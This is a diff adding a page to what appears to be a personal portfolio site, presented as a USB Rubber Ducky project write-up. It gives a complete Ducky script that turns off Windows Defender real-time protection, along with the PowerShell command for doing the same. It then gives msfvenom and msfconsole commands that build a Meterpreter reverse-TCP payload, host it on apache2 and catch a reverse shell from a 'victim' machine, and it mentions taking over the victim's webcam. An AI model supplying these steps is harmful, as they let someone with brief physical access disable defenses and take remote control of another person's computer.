@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="home.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <title>Rohan Senthil</title>
+    <link rel="shortcut icon" href="assets/logo.ico" type="image/x-icon">
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="navlist">
+            <p><a href="#about" class="NavText">About</a></p>
+            <p><a href="#achievement" class="NavText">Achievements</a></p>
+            <p><img class="logo" src="assets/logo.svg"></p>
+            <p><a href="#projects" class="NavText">Projects</a></p>
+            <p><a href="#testimonies" class="NavText">Testimonies</a></p>
+        </div>
+    </div>
+
+    <div class="content">
+        <h1>USB Rubber Ducky</h1>
+        <h3>Part 1: Disabling Windows Defender</h3>
+        <p class="long-desc">
+            Firstly, since this is my first project with the USB Rubber Ducky, I must learn the language used for ducky scripts. This can be found on the card given with the USB Rubber ducky as well as on <span class="links">[https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language]</span>  <br><br>
+
+            Some important commands are : <span class="commands">REM</span> (For commenting) , <span class="commands">DELAY </span> (creates a momentary pause in the ducky script) , <span class="commands">STRING</span>, <span class="commands">GUI</span> (Emulates the Windows-Key). <br>
+            
+            Note that commands are in ALL CAPS <br><br>
+            
+            With this I am able to write the script to disable Windows defender. To do this we must know the command in powershell to disable Windows defender which happens to be <span class="commands">`Set-MpPreference -DisableRealtimeMonitoring $true`</span>. <br><br>
+            
+            However, after trying my own script as well as scripts made by others I realised that this command does not work anymore therefore instead of taking the powershell route, we must get the ducky to navigate through the interface. <br><br> Got the base of the script to execute this from <span class="links">[https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WIN10-Disable-Windows-Defender]</span>
+            
+            However, it still did not work therefore I had to edit the script and after several changes and attempts the scripts works. <br><br> Encoded it using <span class="links">[https://ducktoolkit.com/encode]</span> <br><br>
+            
+            Script after editing it myself is: <br><br>
+            
+            <span class="commands">DELAY 1000 <br> REM Open Windows Defender settings <br> CTRL ESC <br> DELAY 1000 <br> STRING Windows Defender Settings <br> DELAY 100 <br> ENTER <br> REM Navigate to realtime protection and disable it <br> DELAY 1000 <br> ENTER <br> DELAY 1000 <br> TAB <br> DELAY 1000 <br> TAB <br> DELAY 1000 <br> TAB <br> DELAY 1000 <br> TAB <br> ENTER <br> DELAY 1000 <br> SPACE <br> DELAY 1000 <br> LEFT <br> DELAY 500 <br> ENTER <br> REM Close Settings <br> DELAY 500 <br> ALT F4</span>
+        </p>
+        <h3>Part 2: Establishing a Reverse Shell Connection</h3>
+        <p class="long-desc">
+            From Project 1, we now know how to disable windows defender. Using this to our advantage, we can achieve a reverse shell connection that wont be detected by windows defender as it has been disabled. The script can be found online so I wont disclose it here. However for the script to work, we must set up our payload using msfvenom in kali linux and host it onto a file sharing service. <br><br>
+
+            To do this, first we must find the ip of our kali machine using ifconfig in the kali terminal. Next we will use the command <span class="commands">'msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourIP LPORT=8080 -f exe > s.exe'</span> in the terminal to create our payload. Now we need to host this file so it can be downloaded when our ducky is activated. We can host it on apache2 (webserver) which comes with kali linux. We do this by using the command <span class="commands">'cp s.exe /var/www/html'</span> followed by <span class="commands">'service apache2'</span> start to start apache2 <br><br>
+
+            Now we need to wait for incoming connections on port 8080 using msfconsole. To do this we will use the commands: <br><br> <span class="commands">`msfconsole`</span> (to start msfconsole) <br> <span class="commands">`use exploit/multi/handler`</span> (to listen for incoming connections) <br> <span class="commands">`set PAYLOAD windows/meterpreter/reverse_tcp`</span> <br> <span class="commands">`set LHOST yourIP`</span> <br> <span class="commands">`set LPORT 8080`</span> <br><br> Now we will type exploit to run the handler and wait for incoming connections which will come in when our rubber ducky is inserted into our victim's device. <br><br>
+
+            <img src="assets/images/Capture.PNG" alt="" class="ducky-img"> <br><br>
+
+            Once I insereted the rubber ducky into the victims (test) device, from the image above you can see that I have established a reverse shell connection. From there I have full access to the victim's device and I can do stuff such as turn on their webcam and capture them if I wanted to. 
+        </p>
+        <a href="home.html" class="back-btn">Return</a>
+    </div>
+
+    <footer>
+        &#169; 2023 Rohan Senthil
+    </footer>
+
+</body>
+</html>
